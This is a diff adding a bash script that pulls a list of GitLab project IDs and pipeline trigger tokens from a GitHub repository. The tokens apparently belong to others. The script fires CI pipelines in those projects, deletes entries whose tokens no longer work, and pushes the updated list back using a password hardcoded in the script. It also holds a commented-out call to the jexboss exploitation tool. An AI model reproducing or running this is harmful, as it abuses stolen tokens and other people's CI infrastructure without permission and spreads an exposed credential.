@@ -1,0 +1,44 @@
+#!/bin/bash
+sourc="/root/list_api"
+
+curl -s https://raw.githubusercontent.com/5y5l0g0x/l00k/master/user_done > /root/list_api
+printf " user ready :"
+printf $(cat $sourc | wc -l)
+echo -e "\n"
+while IFS= read line
+do
+
+        printf  $line
+	printf  " -----> "
+	do_usr=$(echo $line | cut -d "#" -f1)
+	do_id=$(echo $line | cut -d "#" -f2)
+	do_tk=$(echo $line | cut -d "#" -f3)
+	#echo $do_id $do_tk $do_usr
+	
+        #python /root/all/jexboss/jexboss.py -u $line
+	stt=$(curl -s -X POST -F token=$do_tk -F ref=master  https://gitlab.com/api/v4/projects/$do_id/trigger/pipeline |  jq '.status')
+        if [ $stt == null ]; 
+	then 
+	printf "dead"
+	sed "/^$do_usr/d" -i $sourc
+	else
+	printf  $stt
+	fi
+	
+	
+	echo ""
+
+done < $sourc
+
+cd /root/
+#rm -rf c0da/
+git clone https://github.com/5y5l0g0x/l00k.git
+cd /root/l00k
+sed -i "s/github/5y5l0g0x:yepyepbaba123A*@github/" /root/l00k/.git/config
+cat $sourc >  /root/l00k/user_done
+git config --global user.email 5y5l0g0x@s00kag3imb.tk
+echo `date` >> time_statu && git add --all && git commit -m "l00000 da v1" && git push origin master
+cd /root/
+rm -rf /root/l00k
+
+
